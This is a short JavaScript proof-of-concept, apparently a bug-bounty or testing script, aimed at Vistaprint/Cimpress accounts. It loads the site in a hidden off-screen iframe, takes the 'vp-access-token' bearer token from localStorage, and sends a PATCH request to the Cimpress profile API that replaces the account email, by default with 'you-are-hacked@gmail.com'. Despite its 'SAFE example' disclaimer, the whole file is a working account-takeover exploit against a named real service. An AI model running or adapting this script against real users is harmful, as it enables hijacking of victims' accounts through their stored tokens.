// SAFE example for testing only — do NOT use to target others.

// sleep helper
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// create small iframe
const iframe = document.createElement("iframe");
iframe.src = "https://pro.vistaprint.com";
iframe.style.width = "1px";
iframe.style.height = "1px";
iframe.style.border = "0";
iframe.style.position = "absolute";
iframe.style.left = "-9999px";
document.body.appendChild(iframe);

(async () => {
  // wait 2 seconds before executing the rest
  await sleep(2000);

  // Prompt appears only if localStorage contains "vp-access-token"
  const stored = localStorage.getItem("vp-access-token");

  if (!stored) {
    console.log('No vp-access-token found in localStorage — nothing to do.');
    return;
  }

  let parsed = null;
  try {
    parsed = JSON.parse(stored);
  } catch (e) {
    console.warn("Failed to parse stored token:", e);
  }

  const token = parsed?.value ?? null;
  if (!token) {
    console.log('Token value missing inside stored item — aborting.');
    return;
  }

  let emails = prompt("Enter the email you want (default -> you-are-hacked@gmail.com)");
  if (emails === null) {
    console.log("Prompt cancelled — aborting.");
    return;
  }

  if (emails.trim() === "") {
    emails = "you-are-hacked@gmail.com";
  }

  const url = 'https://profile.cimpress.io/v1/ozoDdrmewShEcbUDWX8J3V/profile/me';
  const payload = {
    email: emails,
    language: 'en-US'
  };

  async function patchProfile() {
    try {
      const res = await fetch(url, {
        method: 'PATCH',
        mode: 'cors',
        cache: 'no-store',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(payload)
      });

      if (!res.ok) {
        const txt = await res.text().catch(() => '');
        throw new Error(`HTTP ${res.status} ${res.statusText} - ${txt}`);
      }

      const data = await res.json().catch(() => null);
      console.log('Success:', data);
      return data;
    } catch (err) {
      console.error('Request failed:', err);
      throw err;
    }
  }

  patchProfile();
})();
